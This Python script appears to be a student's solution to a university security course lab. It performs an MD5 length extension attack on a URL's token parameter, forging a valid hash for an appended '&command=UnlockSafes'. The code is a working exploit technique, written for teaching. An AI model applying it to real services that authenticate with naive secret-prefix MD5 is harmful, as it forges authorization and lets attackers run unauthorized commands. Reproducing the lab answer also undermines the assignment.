#!/usr/bin/python3

import sys
from urllib.parse import quote, urlparse, parse_qs, urlsplit, urlencode
from pymd5 import md5, padding


##########################
# Example URL parsing code:
res = urlparse('https://project1.ecen4133.org/test/lengthextension/api?token=41bd1ccd26a75c282922c2b39cc3bb0a&command=Test1')
# res.query returns everything after '?' in the URL:
assert(res.query == 'token=41bd1ccd26a75c282922c2b39cc3bb0a&command=Test1')

###########################
# Example using URL quoting
# This is URL safe: a URL with %00 will be valid and interpreted as \x00
assert(quote('\x00\x01\x02') == '%00%01%02')

if __name__ == '__main__':
    if len(sys.argv) < 1:
        print(f"usage: {sys.argv[0]} URL_TO_EXTEND", file=sys.stderr)
        sys.exit(-1)

    # Get url from command line argument (argv)
    url = sys.argv[1]

    #################################
    # Your length extension code here
    attack_str="&command=UnlockSafes"
   	
    res = urlparse(url)

    secret_key_size = 8
    
    token = parse_qs(res.query)['token']
    commands = parse_qs(res.query)['command']
    #print(token,res.query)
    commands_str = res.query[res.query.find("command"):]
    
    before_padding_sz = secret_key_size + len(commands_str)
    after_padding_bits = 8*(before_padding_sz + len(padding(before_padding_sz*8)))
    #print('after pad',after_padding_bits)
 
    hash_state = md5(state=bytes.fromhex(token[0]),count=after_padding_bits)
    hash_state.update(attack_str)
    #print('after mod',hash_state.hexdigest())
  
    pad_str=quote(padding(before_padding_sz*8))
    
    query_new = "token=" + hash_state.hexdigest() + '&' + commands_str
    print(url[:url.find('token')] + query_new + pad_str + attack_str)

